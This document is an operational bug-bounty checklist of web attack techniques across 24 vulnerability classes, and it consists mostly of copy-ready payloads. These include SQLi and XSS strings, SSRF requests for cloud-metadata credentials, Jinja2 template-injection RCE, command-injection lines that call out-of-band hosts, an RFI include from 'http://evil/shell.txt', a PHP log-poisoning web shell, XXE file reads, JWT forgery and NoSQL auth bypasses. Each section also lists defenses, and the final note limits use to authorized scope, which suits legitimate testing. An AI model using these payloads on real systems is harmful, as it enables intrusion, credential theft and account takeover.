# Vulnerability checklists (operational, 2025-2026)

> Format: each item is an action. Go top to bottom, mark `[x]`. Paste the needed block at the start of the vulnerability section.
> Payloads are technical - copy as is. Detailed research (impact, CVE, sources) is in a separate reference document.

**Contents:** [SQLi](#1-sql-injection) · [XSS](#2-xss) · [SSRF](#3-ssrf) · [SSTI](#4-ssti) · [IDOR/BOLA](#5-idor--bola) · [CSRF](#6-csrf) · [Command Injection](#7-command-injection) · [LFI/RFI + Traversal](#8-lfirfi--directory-traversal) · [XXE](#9-xxe) · [Deserialization](#10-insecure-deserialization) · [JWT](#11-jwt) · [OAuth](#12-oauth-misconfiguration) · [ATO](#13-account-takeover) · [Business Logic](#14-business-logic) · [Race Condition](#15-race-condition) · [CORS](#16-cors) · [Open Redirect](#17-open-redirect) · [Request Smuggling](#18-request-smuggling-http-desync) · [GraphQL](#19-graphql) · [NoSQLi](#20-nosql-injection) · [Prototype Pollution](#21-prototype-pollution) · [Mass Assignment](#22-mass-assignment) · [Web Cache Deception](#23-web-cache-deception--poisoning) · [Recon/Methodology](#24-recon--methodology-старт-на-новой-цели)

---

## 1. SQL Injection

**Recon / where to look**
- [ ] List all input points: GET, POST, cookie, headers (`User-Agent`, `Referer`, `X-Forwarded-For`), JSON fields
- [ ] Note parameters that look like DB queries: `id`, `search`, `filter`, `sort`, `order`, `category`

**Detection**
- [ ] For each parameter: `'` -> watch for 500/error/changed response
- [ ] Paired probe: `'` breaks, `''` fixes -> strong SQLi indicator
- [ ] Boolean: `1' AND '1'='1` vs `1' AND '1'='2` -> difference in response
- [ ] Time-based (Postgres): `'||pg_sleep(5)--`
- [ ] Time-based (MySQL): `' AND SLEEP(5)-- -`
- [ ] Time-based (MSSQL): `'; WAITFOR DELAY '0:0:5'--`

**Exploitation**
- [ ] UNION: determine number of columns via `' ORDER BY 1-- -`, `2`, `3`... until error
- [ ] UNION: find reflected columns `' UNION SELECT 1,2,3-- -`
- [ ] Pull version/DB name into a reflected column (`@@version`, `version()`)
- [ ] If there is no output -> boolean-blind or time-blind character by character
- [ ] Error-based if errors are visible in the response

**WAF / filter bypass**
- [ ] JSON syntax (bypasses most WAFs): operators `'@>`/`<@`/`?` (PostgreSQL JSON operators) / escaping via JSON
- [ ] Inline comments: `SEL/**/ECT`, `UN/**/ION`
- [ ] Case change: `SeLeCt`
- [ ] Unicode / double-encoding
- [ ] Injection in cookie or second parameter (`sqlmap --param-filter=cookie`)
- [ ] `sqlmap` tamper: `randomcase.py`, `space2comment.py`, `charunicodeencode.py`

**Tools:** `sqlmap` (+ tamper), `ghauri`, Burp Intruder
**Defense (for the report):** prepared statements / parameterized queries everywhere; least-privilege DB account; WAF as a secondary layer

---

## 2. XSS

**Recon / where to look**
- [ ] Find all reflection points (input -> reflected in the HTML response)
- [ ] Find stored points (name, comment, profile, file name)
- [ ] DOM: grep JS for sources `location.hash`, `location.search`, `postMessage`, `document.referrer`
- [ ] DOM: find sinks `innerHTML`, `outerHTML`, `eval`, `document.write`, `setAttribute('href'/'src')`

**Detection**
- [ ] Insert marker `xss1234` -> find it in the response -> identify the context (HTML / attribute / JS / URL)
- [ ] Check which characters pass through unescaped: `<` `>` `"` `'` `` ` `` `/`

**Exploitation (by context)**
- [ ] HTML context: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`
- [ ] HTML context (new tags): `<details ontoggle=alert(1) open>`, `<video onloadstart=alert(1) src=x>`
- [ ] Attribute: break out of it `"><svg onload=alert(1)>`
- [ ] JS string: `';alert(1)//`
- [ ] DOM: feed the payload into the source (`#<img src=x onerror=alert(1)>`) and check the sink in DevTools

**Filter / CSP bypass**
- [ ] mXSS against the sanitizer (DOMPurify): `<math><mtext><table><mglyph><style><!--</style><img title="-->...">`
- [ ] DOM clobbering: `<a id=x><a id=x name=...>` to overwrite variables
- [ ] CSP bypass via `strict-dynamic` + clobbering (`script.src`)
- [ ] Injection via headers (`X-Forwarded-For`, `User-Agent`) into a stored point
- [ ] Payload fragmentation/encoding

**Tools:** Burp DOM Invader, `dalfox`, Hackvertor, `semgrep`/CodeQL (source->sink)
**Defense (for the report):** context-aware escaping; CSP with nonce/hash; Sanitizer API (assigns DOM, not a string); Trusted Types

---

## 3. SSRF

**Recon / where to look**
- [ ] Find url parameters: `url`, `uri`, `proxy`, `webhook`, `callback`, `import`, `fetch`, `feed`, `dest`, `link`
- [ ] Find functions that pull external resources: import by URL, link previews, PDF/image rendering, webhooks, SSO discovery

**Detection**
- [ ] Substitute your Collaborator/`interactsh` domain -> wait for a DNS/HTTP callback (blind)
- [ ] Substitute `http://127.0.0.1:80/` and internal ports -> watch the difference in responses/timings

**Exploitation - cloud metadata**
- [ ] AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- [ ] AWS (IMDSv2 needs a token): `PUT /latest/api/token` + header `X-aws-ec2-metadata-token-ttl-seconds`
- [ ] GCP: `http://metadata.google.internal/computeMetadata/v1/` + header `Metadata-Flavor: Google`
- [ ] Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true`
- [ ] EKS Pod Identity: `http://169.254.170.23/...` (env `AWS_CONTAINER_CREDENTIALS_FULL_URI`)

**Filter bypass**
- [ ] Decimal/hex IP: `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1`
- [ ] Userinfo trick: `http://localhost@attacker.com`, `http://attacker.com#localhost`
- [ ] IPv6 / short forms: `http://[::1]/`, `http://[::ffff:169.254.169.254]/`, `http://0/`, `http://0.0.0.0/`; follow a 30x redirect from an allowed host to `169.254.169.254`
- [ ] Alternative schemes: `gopher://` (Redis/SMTP), `dict://`, `file://`
- [ ] DNS rebinding (TOCTOU) - if validation and the request are separated (Singularity)
- [ ] If IMDSv2 is enabled -> look for a service that renders HTML/XML (iframe `<iframe src="http://169.254.169.254/...">` in pandoc-like converters)

**Tools:** Burp Collaborator, `interactsh`, `SSRFmap`, `gopherus`, Singularity
**Defense (for the report):** IMDSv2 `HttpTokens=required` + hop limit; domain allowlist; egress filter to RFC1918/link-local; resolve DNS and request in one step

---

## 4. SSTI

**Recon / where to look**
- [ ] Find points where input lands in a template: emails, custom messages, names, export, document generation

**Detection**
- [ ] Polyglot (triggers an error when vulnerable): `${{<%[%'"}}%\`
- [ ] Math: `{{7*7}}` -> `49`; `${7*7}`; `<%= 7*7 %>`; `#{7*7}`
- [ ] Identify the engine from the reaction via the Hackmanit Template Injection Table

**Exploitation (by engine)**
- [ ] Jinja2: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`
- [ ] Jinja2 (via request): `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|...}}`
- [ ] Java/SpEL, Freemarker, Velocity, Smarty, Twig -> see `Server Side Template Injection/` in PaTT

**Filter bypass**
- [ ] Access via `[]` instead of `.`
- [ ] Hex literals `\x5f` instead of `_`
- [ ] Build strings from ASCII: `chr()` (Jinja2), `((char)105)` (Java)
- [ ] Comments `/**/`; alternative block tags `{% %}`
- [ ] RCE without quotes/plugins via the engine's native functions (Jinja2 `chr`, Smarty modifiers, Blade `array_map`+`implode`+`chr`)

**Tools:** `SSTImap`, `tinja`, `tplmap`, Hackmanit Template Injection Table
**Defense (for the report):** do not concatenate input into the template (pass it as data); sandbox (remember it can be bypassed)

---

## 5. IDOR / BOLA

**Recon / where to look**
- [ ] Set up 2 accounts: A (attacker) and B (victim)
- [ ] Collect all object IDs in requests: numeric, UUID, hash, base64

**Detection**
- [ ] In account A's requests, swap the ID for account B's object ID -> get access?
- [ ] Check ALL methods on the object: `GET`, `PUT`, `PATCH`, `DELETE`
- [ ] Check without authorization (remove cookie/token) -> does access remain?

**Exploitation / nuances**
- [ ] Not just `id±1`: take UUIDs from public endpoints and shared links
- [ ] Decode "indirect" IDs: base64 (`MTIzNDU2`->`123456`), hash -> look for sequential ints
- [ ] Function-level: as a regular user, hit `/admin/...`, `/api/internal/...`
- [ ] Chain: IDOR + Mass Assignment -> set `password`/`email` on someone else's object -> ATO
- [ ] Array/object wrap & HPP: `id[]=victim`, `{"id":[victim]}`, duplicate `id=self&id=victim` - the backend authorizes one value and acts on another

**Tools:** Burp **Autorize** (replay with low-priv cookie), Repeater, Logger, `ffuf` (shadow endpoints, Swagger)
**Defense (for the report):** server-side object ownership check; indirect object references; user-context validation
> ⚠️ Without a second account you cannot prove IDOR. A 403 can be client-side - replay the request without the extra headers.

---

## 6. CSRF

**Recon / where to look**
- [ ] Find state-changing requests (email/password change, transfer, settings)
- [ ] Check for an anti-CSRF token and **its validation** (delete/swap the token)
- [ ] Look at the `SameSite` attribute on the session cookie (is there an explicit one, or the Chrome default)

**Detection / bypasses**
- [ ] Token is not validated or accepts someone else's/empty -> CSRF exists
- [ ] Server does not distinguish GET/POST -> top-level GET: `<script>location='https://site/account/transfer?to=hacker&amount=1000000'</script>`
- [ ] Cookie **without an explicit** `SameSite` -> Lax+POST 120 s window: send a top-level POST in the first 2 minutes after the cookie is issued
- [ ] Force-refresh the victim's session cookie before the attack (OAuth/SSO flow) -> hit the window
- [ ] XSS/injection on a sibling subdomain -> bypass site-based SameSite (keyed on eTLD+1)
- [ ] `SameSite=Strict` -> look for a **client-side** redirect gadget (the browser treats it as same-site; a server-side redirect does NOT work)
- [ ] Method override (Symfony): `GET /change-email?email=...&_method=POST` (GET on the wire, the framework routes it as POST)

**Exploitation**
- [ ] Build a PoC with a form (Burp -> "Generate CSRF PoC") and test it on your own account

**Tools:** Burp "Generate CSRF PoC"
**Defense (for the report):** synchronizer token / double-submit + `SameSite=Strict`; remember that SameSite != protection from same-site-cross-origin

---

## 7. Command Injection

**Recon / where to look**
- [ ] Find functions that call the shell: `ping`/`nslookup`/`traceroute`, converters, archiving, export, file name processing

**Detection**
- [ ] In-band: `;id`, `|id`, `` `id` ``, `$(id)`, `&&id`, `||id`
- [ ] Blind time: `;sleep 10`, `& ping -n 11 127.0.0.1`
- [ ] Blind OOB: `;nslookup $(whoami).<collab>`, `;curl http://<collab>/`

**Exploitation**
- [ ] Confirm execution (output of `id`/delay/DNS callback)
- [ ] Argument injection (CWE-88): if there is no direct injection - try slipping an extra flag into an argument

**Filter bypass**
- [ ] Space -> `$IFS` or `${IFS}`
- [ ] Glob: `/???/??t /???/p??s??` (= `/bin/cat /etc/passwd`)
- [ ] Quotes/concatenation: `w'h'oami`, `who$@ami`
- [ ] CRLF `\r\n` (if escaping does not account for the line break)
- [ ] `dash` vs `bash` differences; payload encoding

**Tools:** Burp Collaborator/`interactsh` (OAST), `commix`
**Defense (for the report):** do not use a shell (API with an argument array); allowlist; escaping is a last resort

---

## 8. LFI/RFI + Directory Traversal

**Recon / where to look**
- [ ] Find path/file parameters: `file`, `page`, `path`, `template`, `include`, `doc`, `lang`

**Detection**
- [ ] Traversal: `../../../../etc/passwd`, `..%2f..%2f`, `....//....//`
- [ ] Null-byte (PHP < 5.3.4): `...%00.png`
- [ ] Reading source: `php://filter/convert.base64-encode/resource=index`

**Exploitation - LFI -> RCE**
- [ ] PHP filter chains (without `allow_url_include`) - generator `php_filter_chain_generator`
- [ ] cnext-exploits (glibc `iconv` overflow) - RCE without writable paths
- [ ] Log poisoning: `User-Agent: <?php system($_GET['c']);?>` + include `/var/log/nginx/access.log`
- [ ] `php://input` + POST body with PHP
- [ ] `data://text/plain;base64,...`
- [ ] `/proc/self/environ`, `expect://`, `phar://` (deserialization)
- [ ] RFI: `?page=http://evil/shell.txt` (with `allow_url_include=On`) or an SMB path on Windows

**WAF bypass**
- [ ] PHP wrapper instead of `../`
- [ ] **Ghost Bits** (Java stack): `.`->`阮`(U+962E), `/`->`阯`(U+962F)
- [ ] Over-long UTF-8, fullwidth solidus `／`, RTL-override, NFKC normalization

**Tools:** `php_filter_chain_generator` (Synacktiv), Lightyear, `cnext-exploits`, `LFImap`, `fimap`
**Defense (for the report):** do not pass input into `include`/`require`/`fopen`; map ID->fixed path

---

## 9. XXE

**Recon / where to look**
- [ ] Find XML points: explicit XML body, SOAP, SAML, SVG/DOCX/XLSX upload
- [ ] Check endpoints tolerant of switching to `Content-Type: application/xml` (JSON->XML pivot)

**Detection / exploitation**
- [ ] Classic: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` + `&xxe;` in a reflected field
- [ ] Blind OOB: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<collab>">%xxe;]>`
- [ ] External DTD for file exfiltration
- [ ] Error-based (if OOB is closed): redefine an external entity via a local DTD
- [ ] Blind XXE -> use it as SSRF for internal recon

**Upload vectors**
- [ ] SVG: `<image xlink:href="file:///etc/passwd">` (works even with general entities disabled)
- [ ] DOCX/XLSX: unpack -> add a DOCTYPE to `word/document.xml` -> repack
- [ ] SAML: DOCTYPE before the signed elements (the signature does not cover the whole document)

**Tools:** Burp Collaborator/`interactsh`, `XXEinjector`
**Defense (for the report):** `disallow-doctype-decl=true`; `external-general-entities=false`; `external-parameter-entities=false`

---

## 10. Insecure Deserialization

**Recon / where to look**
- [ ] Find serialized data by signatures: Java `rO0`/`0xACED`, .NET `AAEAAAD` / hex `00 01 00 00 00 FF FF FF FF`, PHP `O:`/`a:`
- [ ] Check cookies, `viewstate`, tokens, cache, queues

**Detection**
- [ ] Java: `URLDNS` probe (DNS lookup, works on any Java version) -> wait for the callback
- [ ] Determine the libraries in the classpath (by behavior/errors) to pick a gadget chain

**Exploitation**
- [ ] Java: `ysoserial` -> pick a chain (`CommonsCollections6`, `C3P0`, `CommonsBeanutils1`)
- [ ] Java 16+: `ysoserial` with `--add-opens=...` or use **GadgetBuilder** (303 combinations, 17 chains working again)
- [ ] .NET: `ysoserial.net`
- [ ] PHP: `phpggc` (+ phar:// on FS calls)

**Tools:** `ysoserial`, **GadgetBuilder**, `ysoserial.net`, `phpggc`, `gadgetinspector`
**Defense (for the report):** do not deserialize untrusted data; class allowlist (`ObjectInputFilter`); keep libraries updated

---

## 11. JWT

**Recon / where to look**
- [ ] Find the JWT (header.payload.signature, starts with `eyJ`)
- [ ] Decode header and payload (Burp JWT Editor)

**Detection / exploitation**
- [ ] `alg:none` + empty signature; try case variations: `none`, `None`, `NONE`, `nOnE`
- [ ] Algorithm confusion RS256->HS256: sign with HS256 using the **public key** as the HMAC secret
- [ ] Get the public key: `/.well-known/jwks.json`, `/jwks.json`
- [ ] `kid` injection: path traversal (`../../dev/null`), SQLi
- [ ] `jku`/`x5u` -> point the URL at your own server with a controlled key
- [ ] Brute weak HMAC secret (`hashcat -m 16500`)
- [ ] Cross-service reuse: check `aud` - is a token from one service accepted by another?
- [ ] Check `exp` (is an expired token accepted)

**Filter bypass**
- [ ] fast-jwt-like bugs: leading whitespace in the public key breaks the regex check (CVE-2026-34950) -> algorithm confusion again

**Tools:** Burp **JWT Editor**, `jwt_tool`, `hashcat`
**Defense (for the report):** explicitly specify the algorithm on verify; allowlist header fields (reject `jku`/`x5u`/`jwk`/`crit`); separate keys

---

## 12. OAuth Misconfiguration

**Recon / where to look**
- [ ] Determine the flow type (authorization code / implicit / PKCE)
- [ ] List the parameters: `redirect_uri`, `state`, `code`, `client_id`, `scope`

**Detection / exploitation**
- [ ] `redirect_uri` manipulation: `https://default-host.com&@foo.evil#@bar.evil/`, `localhost.evil.com`, duplicate parameters
- [ ] `state` missing/not checked -> CSRF on account linking
- [ ] Pre-account takeover: register an account on the victim's email before their first OAuth login -> merge without an ownership check
- [ ] Identity injection: login by mutable `email` (rather than immutable `sub`/Object ID)
- [ ] Authorization-code swap: a stolen code from any application -> first-party token (if client/redirect/nonce is not checked)
- [ ] Reflected XSS in `error_description`/`redirectUrl` on the trusted callback
- [ ] PKCE downgrade/removal: drop `code_challenge` or switch `S256`->`plain` (or supply your own verifier) -> an intercepted code is exchangeable again
- [ ] Authorization-code reuse: the server doesn't invalidate the code after the first exchange -> replay a stolen code for a second token
- [ ] code/token leak via Referer: a callback carrying `code`/`token` in the URL leaks to third-party resources (img/script/link) through the Referer header
- [ ] Scope escalation: tamper/expand `scope` in the authorization request or at exchange -> a token with more rights than the client should have
- [ ] IdP mix-up: in multi-IdP setups start the flow with the attacker IdP, feed the honest IdP's callback -> the `code` goes to the wrong token endpoint (if there is no `iss`/IdP binding)

**Tools:** Burp, Doyensec OAuth Security Cheat Sheet
**Defense (for the report):** strict `redirect_uri` validation; PKCE (S256, mandatory); email verification; bind the code to client/redirect/nonce; single-use code; check `iss`

---

## 13. Account Takeover

> ATO is almost always a chain. Run each vector:

- [ ] Password reset: token leaks into Referer / into the response / is predictable
- [ ] Password reset: `Host`-header poisoning -> the link with the reset token goes to your domain
- [ ] Email change without re-auth (+ chain with IDOR/Mass Assignment on someone else's profile)
- [ ] OAuth pre-account takeover
- [ ] JWT forge
- [ ] 2FA bypass: response manipulation (`{"success":false}`->`true`), step skip, OTP brute (+ race)
- [ ] Session is not invalidated after a password change
- [ ] Username/email collision: leading/trailing spaces (`"admin "`), Unicode normalization (NFKC) and IDN homoglyphs (Cyrillic `а`, `demⓞ@x.com`) collapse your account into the victim's on reset/merge

**Tools:** Burp, Autorize
**Defense (for the report):** invalidate all sessions on password/email change; re-auth on sensitive actions; secure reset tokens
> For the report - a full PoC with a real takeover of someone else's account, not theory.

---

## 14. Business Logic

**Recon / where to look**
- [ ] Fully map out the target workflow (checkout, transfer, ordering, upgrade)
- [ ] List the invariants that "should" hold (price >= 0, steps in order, limits)

**Detection / exploitation**
- [ ] Break the step order: skip / repeat / execute from a different state
- [ ] Boundary values: negative quantity, `0`, fractional, huge, overflow
- [ ] Price/currency/discount manipulation in the request
- [ ] Coupons/referrals: reapply, abuse
- [ ] Cart/order state: swap after the price is calculated
- [ ] Replay of a single operation (+ race)

**Tools:** manual analysis + Burp Repeater; Turbo Intruder for edge cases
**Defense (for the report):** server-side validation of invariants and state transitions; idempotency

---

## 15. Race Condition

**Recon / where to look**
- [ ] Find an operation on shared state: promo code, balance, withdrawal, OTP attempts, registration/invite limit, like/vote

**Detection / exploitation**
- [ ] Duplicate the request 20-30 times
- [ ] HTTP/2: send as a group in parallel (Burp Repeater -> "Send group in parallel" = single-packet attack)
- [ ] HTTP/1: Turbo Intruder with last-byte sync
- [ ] Check for the anomaly: double debit/credit, limit bypass, two effects from one token
- [ ] Large payload / bypassing the numeric OTP limit -> first-sequence-sync (Flatt) against the 65,535-byte limit

**Tools:** Burp Repeater (tab groups), **Turbo Intruder** (`race-single-packet-attack.py`)
**Defense (for the report):** atomic operations/transactions; `SELECT ... FOR UPDATE`; idempotency keys; unique constraints

---

## 16. CORS

**Recon / where to look**
- [ ] Find endpoints with sensitive data that return CORS headers

**Detection / exploitation**
- [ ] Send `Origin: https://attacker.com` -> reflected in `Access-Control-Allow-Origin`?
- [ ] Check `Access-Control-Allow-Credentials: true` next to a reflected origin -> critical
- [ ] `Origin: null` -> accepted? (exploit via a sandboxed iframe `srcdoc`)
- [ ] Regex bypass: `example.com.attacker.com`, `examplexcom` (unescaped dot), `hackersnormal-website.com` (suffix)
- [ ] Trusted subdomain with XSS / subdomain takeover
- [ ] Build a PoC: `fetch(url,{credentials:'include'})` from your origin -> read the response

**Tools:** `CORScanner`, `nuclei`, Burp
**Defense (for the report):** strict origin allowlist; do not reflect; do not whitelist `null`; do not combine `*` with credentials
> CORS != protection from CSRF.

---

## 17. Open Redirect

**Recon / where to look**
- [ ] Find redirect parameters: `url`, `next`, `return`, `returnUrl`, `redirect`, `dest`, `continue`, `goto`
- [ ] Check DOM sources (`location`, `location.hash`) -> sink `location.href`

**Detection / exploitation**
- [ ] `//evil.com`, `https://evil.com`, `https:evil.com`, `/\evil.com`
- [ ] `/%2f%2fevil.com`, `https:/evil.com`, double-encoding
- [ ] `http://trusted.com.evil.com`, `http://trusted.com@evil.com`
- [ ] Whitelisted domain in the path/fragment

**Chain (the main value)**
- [ ] Client-side open redirect -> bypass `SameSite=Strict` CSRF
- [ ] Theft of the OAuth `code`/token via `redirect_uri`
- [ ] SSRF amplification: redirect from an allowed host to `169.254.169.254`

**Tools:** `OpenRedireX`, `gf` patterns, Burp Intruder
**Defense (for the report):** target allowlist; relative paths; map ID->URL

---

## 18. Request Smuggling (HTTP Desync)

**Recon / setup**
- [ ] Install **HTTP Request Smuggler v3.0** (Burp BApp)
- [ ] Identify the chain (CDN/proxy): if the front is nginx/Akamai/CloudFront/Fastly (no upstream HTTP/2) -> higher priority

**Detection**
- [ ] Right-click the request -> "Launch smuggle probe"
- [ ] Run the classes: CL.TE, TE.CL, TE.0, CL.0, **0.CL**, H2-downgrade
- [ ] Confirm via timeout / "Mystery 400" (likely exploitable)
- [ ] V-H / H-V parser discrepancy on Host (detection in v3.0)

**Exploitation**
- [ ] Request prefix (capturing someone else's request)
- [ ] Response-queue poisoning
- [ ] Header injection into someone else's request
- [ ] Cache poisoning via a smuggled request
- [ ] 0.CL: break the deadlock via an early-response gadget (IIS `/con`, `/nul`)
- [ ] Expect-based: `Expect: 100-continue` (vanilla) and `Expect: y 100-continue` (obfuscated)
- [ ] Double-desync: 0.CL -> CL.0 to poison the victim's request

**Tools:** HTTP Request Smuggler v3.0, HTTP Hacker, Turbo Intruder (`0cl-find-offset.py`)
**Defense (for the report):** end-to-end HTTP/2 (including upstream front<->origin); single software/config; disable upstream connection reuse; reject GET/HEAD with a body

---

## 19. GraphQL

**Recon / where to look**
- [ ] Find the endpoint: `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql`
- [ ] Introspection: `{__schema{types{name fields{name}}}}` -> dump the schema
- [ ] Visualize the schema (GraphQL Voyager), find admin/internal/legacy types and mutations

**Detection / exploitation**
- [ ] Batching (array of operations) -> rate-limit bypass / brute force
- [ ] Aliases (even with batching disabled): `a1: login(...) a2: login(...)` in one request
- [ ] BOLA/IDOR in mutations (field-level authz is often incomplete)
- [ ] DoS: deep recursion of cyclic types; N alias copies of an expensive resolver; `first:99999999`
- [ ] Field suggestions enabled -> schema enumeration even without introspection
- [ ] GraphQL CSRF: mutation via `Content-Type: text/plain` / `x-www-form-urlencoded` or query-over-GET (skips the JSON preflight, no CSRF token)

**Tools:** **InQL**, `GraphQLmap`, GraphQL Voyager, GraphQL Raider
**Defense (for the report):** disable introspection in prod (unauth); query depth/complexity limit; rate-limit by number of operations; persisted queries; per-resolver authz

---

## 20. NoSQL Injection

**Recon / where to look**
- [ ] Find authentication and search parameters (MongoDB backend)

**Detection / exploitation**
- [ ] Operator injection (urlencoded): `username[$ne]=x&password[$ne]=x`
- [ ] Operator injection (JSON): `{"username":{"$ne":""},"password":{"$ne":""}}`
- [ ] Auth bypass variants: `login[$gt]=admin&login[$lt]=test&pass[$ne]=1`, `login[$nin][]=admin&pass[$ne]=toto`
- [ ] Data extraction (character by character): `login[$regex]=^a.*`
- [ ] `$where` (server-side JS): inject a JS condition
- [ ] PHP arrays: `parameter[arrName]=foo`

**Tools:** `NoSQLMap`, `nosqli`, Burp-NoSQLiScanner
**Defense (for the report):** cast input to a string; wrap in `$eq`; typed structs (not generic maps); disable `$where`/server-side JS

---

## 21. Prototype Pollution

**Recon / where to look**
- [ ] Find the source: JSON body, query string, `location.hash`, merge/clone/extend of user objects

**Detection / exploitation (client)**
- [ ] Inject: `?__proto__[test]=polluted` -> check `Object.prototype.test` in the console
- [ ] DOM Invader: source-finding mode + "Break on property access" for gadgets
- [ ] Find a gadget -> DOM XSS (for example a `script.src` / `setTimeout` sink)

**Detection / exploitation (server, Node)**
- [ ] `{"__proto__":{"isAdmin":true}}` -> privilege escalation
- [ ] `constructor.prototype.X` if `__proto__` is filtered
- [ ] Gadget chain -> RCE (GHunter/Dasty)

**Tools:** Burp **DOM Invader**, `ppfuzz 2.0`, `protoStalker`, GHunter/Dasty
**Defense (for the report):** `Object.create(null)` for user data; `Object.freeze(Object.prototype)`; block keys `__proto__`/`constructor`/`prototype`; `Map` instead of objects

---

## 22. Mass Assignment

**Recon / where to look**
- [ ] Intercept update/register/profile requests (PUT/PATCH/POST)
- [ ] Source of hidden field names: Swagger/OpenAPI, GraphQL introspection, API responses

**Detection / exploitation**
- [ ] First add a fake field -> response did not change -> there is probably a filter
- [ ] Add sensitive ones: `"is_admin":true`, `"role":"admin"`, `"balance":999999`, `"is_premium":true`, `"verified":true`
- [ ] Case variations: `IsAdmin`, `ROLE`, `isAdmin:"true"`
- [ ] Nesting: `"role":{"name":"admin"}`, `"permissions":{"admin":true}`
- [ ] Numeric/array: `"role":1`, `"access_level":9999`, `"roles":["user","admin"]`
- [ ] Bool as string/number: `"is_admin":1`
- [ ] Chain with IDOR -> set `password`/`email` on someone else's object -> ATO

**Tools:** Burp Repeater/Intruder, `Param Miner`, `ffuf` (shadow endpoints)
**Defense (for the report):** allowlist of editable fields (DTO/binding allowlist); separate the input model from the DB model

---

## 23. Web Cache Deception / Poisoning

**Recon / where to look**
- [ ] Find a private authenticated endpoint (`/my-account`, `/api/me`)
- [ ] Understand the CDN<->origin pairing (Cloudflare+Nginx, CloudFront+Apache, Azure)

**Detection / exploitation (deception)**
- [ ] Add a static extension/delimiter: `/my-account/x.js`, `/my-account;.css`, `/my-account$.js`
- [ ] Watch `X-Cache: miss`->`hit`, headers `Cache-Control`/`Age`
- [ ] Open the same URL from another session -> the victim's private response is visible = confirmed

**Detection / exploitation (poisoning)**
- [ ] `Param Miner` -> find unkeyed inputs (headers) that poison the cache
- [ ] Cache a malicious response under a shared key

**Tools:** **CacheKiller** (PortSwigger), `Param Miner`
**Defense (for the report):** do not cache dynamic content; consistent URL parsing CDN<->origin; `Cache-Control: no-store` for private content

---

## 24. Recon / Methodology (starting on a new target)

> Not a vulnerability but the order of approach. Prioritized by ROI.

**Recon**
- [ ] Subdomains: `subfinder`, `amass`
- [ ] URL/history: `gau`, `katana`, `waybackurls`
- [ ] JS endpoints: `LinkFinder`, manual grep `fetch(`/`axios`/`/api/`
- [ ] Ports: `naabu`/`nmap`
- [ ] Fingerprint: Wappalyzer, favicon-hash, headers, token/cookie format
- [ ] Hidden parameters: `Param Miner`, `Arjun`
- [ ] Hidden paths/endpoints: `ffuf`, `feroxbuster`
- [ ] Find the Swagger/OpenAPI/GraphQL schema

**Testing order (top = higher ROI)**
- [ ] 1. API logic: BOLA/IDOR + Mass Assignment + Excessive Data Exposure (2 accounts + Autorize)
- [ ] 2. Account Takeover chains (OAuth pre-ATO, reset flow, JWT)
- [ ] 3. SSRF on any url parameter -> cloud metadata + DNS rebinding
- [ ] 4. Injection (SQLi/NoSQLi/Command/SSTI/XXE) with OAST for blind
- [ ] 5. Desync / Race / Cache on sensitive operations

**Minimum tooling**
- [ ] Burp Suite Pro: DOM Invader, Turbo Intruder, HTTP Request Smuggler v3.0, JWT Editor, Param Miner, Autorize
- [ ] `nuclei`, `ffuf`, `sqlmap`, `interactsh`/Collaborator

**Thresholds that change tactics**
- [ ] WAF visible -> JSON-based SQLi, Ghost Bits for traversal, tamper scripts, find origin IP behind the CDN
- [ ] `/graphql` present -> introspection + batching before REST
- [ ] CDN without upstream HTTP/2 (nginx/Akamai/CloudFront/Fastly) -> desync priority
- [ ] Cookie without an explicit `SameSite` -> Lax+POST 120 s window; `SameSite=Strict` -> client-side redirect gadget

**When reporting**
- [ ] Full reproducible PoC (2 accounts for IDOR; working desync prefix; real data capture)
- [ ] A clear impact block
- [ ] Check for duplicates in disclosed reports
- [ ] A simple bug (a single IDOR/XSS) - send fast; a complex chain - push it to maximum impact

---

> ⚠️ **Scope.** PHP filter chains RCE, cnext, ysoserial/GadgetBuilder, single-packet race are destructive/heavy. Only within authorized scope; many programs prohibit DoS and mass account creation.
